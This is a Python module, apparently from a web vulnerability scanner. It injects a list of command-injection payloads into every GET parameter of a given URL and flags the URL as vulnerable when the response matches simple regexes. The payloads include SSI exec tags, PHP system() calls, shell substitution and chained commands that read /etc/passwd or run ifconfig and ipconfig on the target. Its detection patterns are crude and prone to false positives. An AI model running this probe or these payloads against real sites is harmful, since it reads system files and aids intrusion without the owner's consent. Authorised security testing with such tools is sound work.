import urllib.parse as urlparse
from sqlinjection import get_html
import re

'''
payloads列表使用几个简单命令检测是否存在命令执行漏洞，并使用正则表达式进行url结果匹配
请求的网址中有特征值后证明存在命令执行漏洞
Unix下使用 cat /etc/passwd,ifconfig两个命令检测是否存在漏洞，并对其命令执行进行变形
Windows下使用ipconfig命令进行检测是否存在漏洞，并对其命令执行进行变形
目前只支持Get方式的命令支持检测，同时payloads中的特征较少，以后可以逐步进行完善
'''
payloads=["&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;",
          ";system('cat%20/etc/passwd')","';system('cat%20/etc/passwd')",'''";system('cat%20/etc/passwd')''',"$(`cat /etc/passwd`)",
          "cat /etc/passwd","%0Acat%20/etc/passwd",'''{{ get_user_file("/etc/passwd") }}''','''<!--#exec cmd="/bin/cat /etc/passwd"-->''',
          '''system('cat /etc/passwd');''','''<?php system("cat /etc/passwd");?>''',
          "ifconfig","| ifconfig","; ifconfig","& ifconfig","&& ifconfig",
          "ipconfig","| ipconfig /all","; ipconfig /all","& ipconfig /all",
          "&& ipconfig /all","ipconfig /all"
]
check_have=[r".*root.*",r".*inet addr.*",r".*Windows.*"]
def Get_com(url):
    domain = url.split("?")[0]
    queries = urlparse.urlparse(url).query.split("&")
    if not any(queries):
        return False, None
    else:
        for payload in payloads:
            website = domain + "?" + ("&".join([param + payload for param in queries]))
            source = get_html.gethtml(website)
            for test in check_have:
                pattern = re.compile(test, re.I)
                if pattern.findall(source):
                    # print("(+)this url have command injection bug {},payload is {}".format(url, payload))
                    return True, payload
    # print("(-)this url haven't command injection bug {}".format(url))
    return False, None

